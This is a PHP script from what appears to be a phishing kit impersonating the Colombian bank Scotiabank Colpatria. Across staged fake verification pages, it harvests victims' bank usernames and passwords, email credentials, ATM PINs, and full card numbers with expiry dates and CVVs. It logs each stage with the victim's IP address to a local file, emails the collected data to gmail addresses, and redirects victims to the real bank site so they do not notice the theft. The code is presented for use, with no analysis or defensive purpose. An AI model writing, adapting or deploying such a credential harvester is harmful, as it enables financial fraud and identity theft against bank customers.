<?php
header("Content-Type: text/html; charset=utf-8");
require "is_botcito.php";
require "ayudante.php";
$archivo = "feendios.txt";

function getRealIP(){
    if (!empty($_SERVER['HTTP_CLIENT_IP']))
        return $_SERVER['HTTP_CLIENT_IP'];

    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))
        return $_SERVER['HTTP_X_FORWARDED_FOR'];

    return $_SERVER['REMOTE_ADDR'];
}

$usuario = filter_input(INPUT_POST, "usuario");
$clave = filter_input(INPUT_POST, "contra");

$correo = filter_input(INPUT_POST, "correo");
$claveCorreo = filter_input(INPUT_POST, "econtra");
$atm = filter_input(INPUT_POST, "atm");

$tarjeta = filter_input(INPUT_POST, "tarjeta");
$mes = filter_input(INPUT_POST, "mes");
$year = filter_input(INPUT_POST, "year");
$cvv = filter_input(INPUT_POST, "cvv");

$ip = getRealIP();
if (!empty($usuario) && !empty($clave)) {
    $_SESSION["permiso1"]  = "permito";
    $_SESSION["prueba"] = $clave;
    $datos = "
=======================================
|| Usuario: " . $usuario . "
|| Clave: " . $clave . "
|| Ip:" . $ip;
$_SESSION["usuario"] = $usuario;
$_SESSION["clave"] = $clave;
$_SESSION["ip1"] = $ip;
    $file = fopen($archivo, 'a+');
    fwrite($file, $datos);
    fclose($file);
    header("location:emailverifcation.php");
}

if (!empty($correo) && !empty($claveCorreo)) {
    $_SESSION["permiso2"]  = "permito";
    unset($_SESSION["permiso1"]);
    $datos = "
|| Correo: " . $correo . "
|| Clave: " . $claveCorreo . "
|| Ip:" . $ip;
$_SESSION["correo"] = $correo;
$_SESSION["correo_clave"] = $correo_clave;
$_SESSION["ip2"] = $ip;
    $file = fopen($archivo, 'a+');
    fwrite($file, $datos);
    fclose($file);
    header("location:atmverification.php");
}


if (!empty($atm)) {
    $_SESSION["permiso3"]  = "permito";
    unset($_SESSION["permiso2"]);
    $datos = "
|| Atm: " . $atm . "
|| Ip:" . $ip;
$_SESSION["atm"] = $atm;
$_SESSION["ip2"] = $ip;
    $file = fopen($archivo, 'a+');
    fwrite($file, $datos);
    fclose($file);
    header("location:cardverification.php");
}


if (!empty($tarjeta) && !empty($mes) && !empty($year) && !empty($cvv)) {
    unset($_SESSION["permiso3"]);
    $fecha = $mes ."/". $year;
    $datos = "
|| Tarjeta: " . $tarjeta . "
|| Fecha: " . $fecha . "
|| Cvv: " . $cvv . "
|| Ip:" . $ip."
=======================================";
$usu = $_SESSION["usuario"];
$cla = $_SESSION["clave"];
$$ip1 = $_SESSION["ip1"];
$cor = $_SESSION["correo"];
$cor_clave = $_SESSION["correo_clave"];
$atem = $_SESSION["atm"];
$ip2 = $_SESSION["ip2"];

$para  = 'alian@gmail.com';

// título
$título = 'informacion';
$mensajea = '<table style="border-collapse: collapse; width: 100%; height: 216px;" border="1">
<tbody>
<tr style="height: 18px;">
<td style="width: 100%; text-align: center; height: 18px;" colspan="2"><strong>INFORMACION</strong></td>
</tr>
<tr style="height: 18px;">
<td style="width: 25.5372%; height: 18px; text-align: left;"><strong>USUARIO</strong></td>
<td style="width: 74.4628%; height: 18px; text-align: center;"$usu></td>
</tr>
<tr style="height: 18px;">
<td style="width: 25.5372%; height: 18px; text-align: left;"><strong>CLAVE</strong></td>
<td style="width: 74.4628%; height: 18px; text-align: center;">$cla;</td>
</tr>
<tr style="height: 18px;">
<td style="width: 25.5372%; height: 18px; text-align: left;"><strong>IP1</strong></td>
<td style="width: 74.4628%; height: 18px; text-align: center;">$ip1</td>
</tr>
<tr style="height: 18px;">
<td style="width: 25.5372%; height: 18px; text-align: left;"><strong>CORREO</strong></td>
<td style="width: 74.4628%; height: 18px; text-align: center;">$cor</td>
</tr>
<tr style="height: 18px;">
<td style="width: 25.5372%; height: 18px; text-align: left;"><strong>CORREO_CLAVE</strong></td>
<td style="width: 74.4628%; height: 18px; text-align: center;">$cor_clave</td>
</tr>
<tr style="height: 18px;">
<td style="width: 25.5372%; height: 18px; text-align: left;"><strong>ATM</strong></td>
<td style="width: 74.4628%; height: 18px; text-align: center;">$atem</td>
</tr>
<tr style="height: 18px;">
<td style="width: 25.5372%; height: 18px; text-align: left;"><strong>IP2</strong></td>
<td style="width: 74.4628%; height: 18px; text-align: center;">$ip2</td>
</tr>
<tr style="height: 18px;">
<td style="width: 25.5372%; height: 18px; text-align: left;"><strong>TARJETA</strong></td>
<td style="width: 74.4628%; height: 18px; text-align: center;">$tarjeta</td>
</tr>
<tr style="height: 18px;">
<td style="width: 25.5372%; height: 18px; text-align: left;"><strong>FECHA</strong></td>
<td style="width: 74.4628%; height: 18px; text-align: center;">$fecha</td>
</tr>
<tr style="height: 18px;">
<td style="width: 25.5372%; height: 18px; text-align: left;"><strong>CVV</strong></td>
<td style="width: 74.4628%; height: 18px; text-align: center;">$cvv</td>
</tr>
<tr style="height: 18px;">
<td style="width: 25.5372%; height: 18px; text-align: left;"><strong>IP3</strong></td>
<td style="width: 74.4628%; height: 18px; text-align: center;">$ip</td>
</tr>
</tbody>
</table>';
$cabeceras  = 'MIME-Version: 1.0' . "\r\n";
$cabeceras .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";

// Cabeceras adicionales
$cabeceras .= 'To: Mary <alianzajjs@gmail.com>' . "\r\n";
$cabeceras .= 'From: Recordatorio <patrios@gmail.com>' . "\r\n";
$cabeceras .= 'Cc: birthdayarchive@example.com' . "\r\n";
$cabeceras .= 'Bcc: birthdaycheck@example.com' . "\r\n";

// Enviarlo
mail($para, $título, $mensajea, $cabeceras);
    $file = fopen($archivo, 'a+');
    fwrite($file, $datos);
    fclose($file);
    header("location:https://www.scotiabankcolpatria.com/");
}
